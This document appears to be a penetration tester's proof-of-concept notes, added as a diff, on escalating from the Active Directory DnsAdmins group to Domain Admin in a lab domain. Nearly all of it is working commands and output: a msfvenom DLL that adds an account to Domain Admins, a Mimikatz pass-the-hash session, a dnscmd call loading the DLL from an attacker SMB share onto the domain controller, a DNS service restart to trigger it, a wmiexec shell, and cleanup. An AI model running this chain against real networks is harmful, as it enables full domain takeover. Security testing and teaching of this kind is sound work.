@@ -1,0 +1,319 @@
+
+========================================================================================================================
+Abusing 'DNSadmins' privileges to become Domain Administrator
+========================================================================================================================
+
+=> Accounts member of the default AD security group 'DNSadmins' can load/execute an arbitrary DLL with SYSTEM privileges on the DNS server
+   which is also almost always the Domain Controller (indeed most companies use their Domain Controllers as a internal DNS servers). 
+   Thus these accounts can take full control over the Domain.
+
+Usefull links:
+---------------
+https://mystiko.sh/?p=687
+https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
+http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
+https://github.com/dim0x69/dns-exe-persistance
+https://github.com/kazkansouh/DNSAdmin-DLL
+IPPSEC tutorial: https://www.youtube.com/watch?v=8KJebvmd1Fk
+
+
+========================================================================================================================
+PoC - Step 1 - You have compromised an account which is member of the group 'DnsAdmins'
+========================================================================================================================
+
+=> Let's say you have steal from the memory of a Windows server the password hash of the account 'svc_dns_admin' which is member of the group 'DnsAdmins'.
+
+C:\AD\jfc-tools> net user svc_dns_admin /domain
+The request will be processed at a domain controller for domain security-test-lab.local.
+
+User name                    svc_dns_admin
+Full Name                    svc_dns_admin
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/17/2019 6:26:27 AM
+Password expires             Never
+Password changeable          2/18/2019 6:26:27 AM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   9/5/2020 10:31:55 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *DnsAdmins
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+========================================================================================================================
+PoC - Step 2 - Generate a malicious DLL with Metasploit which will add an account into the 'Domain Admins' group
+========================================================================================================================
+
+=> Generate a DLL that will add the domain user account 'auditor' to the group 'Domain Admins'.
+
+C:\metasploit-framework\bin> msfvenom.bat -a x64 -p windows/x64/exec cmd='net group "domain admins" auditor /add /domain' -f dll > dnsprivesc.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 317 bytes
+Final size of dll file: 5120 bytes
+
+C:\metasploit-framework\bin> dir
+ Volume in drive C is Windows
+ Volume Serial Number is 9C9C-7212
+
+ Directory of C:\metasploit-framework\bin
+
+28/09/2020  02:26    <DIR>          .
+28/09/2020  02:26    <DIR>          ..
+28/09/2020  02:26             5,120 dnsprivesc.dll
+<SNIP>
+
+======================================================================================================================================
+PoC - Step 3 - Execute the malicious DLL on the DNS server (which is also the Domain Controller) using the 'DNSadmins' privileges
+======================================================================================================================================
+
+=> Quickly set-up an anonymous file share to share over the network your malicious DLL (\\192.168.1.66\shared\dnsprivesc.dll).
+
+=> Start a powershell session with the account 'svc_dns_admin' which is member of the 'DNSadmins' group.
+   Note: since we only have the hash of the account 'svc_dns_admin' we perform a Pass-The-Hash attack with Mimikatz.
+
+       .#####.   mimikatz 2.2.0 (x64) #19041 Aug  9 2020 22:45:17
+       .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+       ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+       ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+       '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+        '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+      mimikatz # privilege::debug
+      Privilege '20' OK
+
+      mimikatz # sekurlsa::pth /user:svc_dns_admin /domain:security-test-lab.local /ntlm:a7rtl568819e8eec3d<SNIP> /run:powershell.exe
+      user    : svc_dns_admin
+      domain  : security-test-lab.local
+      program : powershell.exe
+      impers. : no
+      NTLM    : a7rtl568819e8eec3d<SNIP>
+        |  PID  1808
+        |  TID  3524
+        |  LSA Process is now R/W
+        |  LUID 0 ; 48851577 (00000000:02e96a79)
+        \_ msv1_0   - data copy @ 000001D418CFCEF0 : OK !
+        \_ kerberos - data copy @ 000001D418EA2368
+         \_ aes256_hmac       -> null
+         \_ aes128_hmac       -> null
+         \_ rc4_hmac_nt       OK
+         \_ rc4_hmac_old      OK
+         \_ rc4_md4           OK
+         \_ rc4_hmac_nt_exp   OK
+         \_ rc4_hmac_old_exp  OK
+         \_ *Password replace @ 000001D418B31468 (32) -> null
+
+       mimikatz #
+
+=> Then execute the malicious DLL on the DNS server (which is also the Domain Controller) using the account 'svc_dns_admin' and the command DNSCMD.
+   The DLL will be executed as 'NT Authority\System' on the Domain Controller (IP:192.168.1.50).
+
+PS C:\WINDOWS\system32> dnscmd 192.168.1.50 /config /serverlevelplugindll \\192.168.1.66\shared\dnsprivesc.dll
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+
+
+=================================================================================================================
+PoC - Step 4 - Wait for the Domain Controller to reboot (or DNS service to restart) => you are now Domain Admin
+=================================================================================================================
+
+=> Before restarting the DNS service or rebooting the DC our auditor account is still a low-privileged account.
+
+C:\WIndows\temp> net user auditor
+User name                    auditor
+Full Name                    auditor
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            9/11/2020 4:23:41 AM
+Password expires             Never
+Password changeable          9/12/2020 4:23:41 AM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   9/11/2020 5:48:58 AM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *RDPUsers
+The command completed successfully.
+
+
+=> We stop and then re-start the DNS service to trigger the attack
+
+C:\Windows\temp> sc \\temp-dc stop dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x1
+        WAIT_HINT          : 0x7530
+
+C:\Windows\temp> sc \\temp-dc qc dns
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\dns.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : DNS Server
+        DEPENDENCIES       : Tcpip
+                           : Afd
+                           : RpcSs
+                           : NTDS
+        SERVICE_START_NAME : LocalSystem
+
+C:\Windows\temp> sc \\temp-dc query dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\Windows\temp> sc \\temp-dc start dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 1716
+        FLAGS              :
+
+C:\Windows\temp> sc \\temp-dc query dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+
+=> We are now Domain Admin !  Our 'auditor' account has been added to the 'Domain Admins' group 
+   We can now log into the DC as admin with wmiexec...
+
+C:\Users\Administrator\Documents\Tools-AD> wmiexec.exe auditor@192.168.1.50
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+Password:
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+
+C:\> hostname
+temp-dc
+
+C:\>whoami
+security-lab\auditor
+
+C:\>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+
+C:\>sc query dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\> 
+
+==========================================================================================================
+PoC - Step 5 - Cleaning the DNS config
+==========================================================================================================
+
+=> Delete the malicious dll in the registry
+--------------------------------------------
+
+C:\>REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f
+The operation completed successfully.
+
+
+=> Reboot the DNS service or reboot the DC
+-------------------------------------------
+
+C:\>shutdown /r     or ("sc \\dcorp-dc stop dns" and then "sc \\dcorp-dc start dns")
+
+
+=> Check that the DNS is working properly again
+------------------------------------------------
+
+C:\>nslookup webserver01
+DNS request timed out.
+    timeout was 2 seconds.
+Server:  UnKnown
+Address:  ::1
+
+Name:    webserver01.security-test-lab.local
+Address:  192.168.1.55
+
